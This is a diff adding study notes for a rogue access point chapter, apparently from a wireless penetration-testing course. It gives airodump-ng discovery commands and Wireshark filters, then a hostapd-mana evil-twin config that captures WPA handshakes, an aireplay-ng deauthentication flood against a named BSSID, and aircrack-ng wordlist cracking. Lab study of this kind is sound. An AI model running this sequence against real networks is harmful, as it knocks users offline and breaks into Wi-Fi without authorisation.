@@ -1,4 +1,54 @@
 # Chapter 8 - Rogue AP
+
+## My Notes
+
+
+## Discovery
+```
+sudo airodump-ng -w discovery --output-format pcap wlan0mon
+
+To get more information, let's open the output Pcap in Wireshark by running wireshark discovery-01.cap.
+
+To find the beacon for the target AP, we can use a filter to limit the types of packets displayed. First, we can display only beacon packets by using the filter:
+
+1) wlan.fc.type_subtype == 0x08. 
+	1) Management frames use "0" as the type and beacon frames are set to "8" as the subtype. 
+2) We can also only target the Mostar SSID by:
+	1) adding && 
+	2) and using the filter wlan.ssid == "Mostar".
+```
+
+## Attack
+```
+
+cat Mostar-mana.conf
+
+interface=wlan0
+ssid=Mostar
+channel=1
+hw_mode=g
+ieee80211n=1
+wpa=3
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=TKIP CCMP
+mana_wpaout=/home/kali/mostar.hccapx
+
+sudo hostapd-mana Mostar-mana.conf
+
+
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+
+aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+
+
+
+```
+-------
+
+## Other Notes
+
 ## Creating a Rogue AP
 Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.
 
